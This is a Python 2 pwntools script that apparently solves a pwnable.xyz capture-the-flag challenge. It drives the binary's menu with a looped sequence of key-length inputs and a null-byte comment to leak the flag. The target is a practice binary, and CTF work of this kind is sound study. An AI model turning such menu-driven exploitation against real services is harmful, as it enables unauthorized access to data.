from pwn import *
from struct import *


def print_flag(answer):
    sh.sendlineafter('> ', '3')
    sh.sendlineafter('instead? ', answer)
    if (answer == 'y'):
        sh.sendlineafter('comment: ', struct.pack("B", 0x00))



def generate_key(i):
    sh.sendlineafter('> ', '1')
    sh.sendlineafter('len: ', str(i))

def load_flag():
    sh.sendlineafter('> ', '2')
def exploit():
    for i in xrange(64, 0, -1):
        generate_key(i)
        load_flag()
        print_flag('n')
        flag =  sh.recvline()
    print flag
        


#sh = remote('svc.pwnable.xyz', 30006)
sh = process('./challenge')
load_flag()
print_flag('y')
generate_key(64)
exploit()


sh.close()
exit()


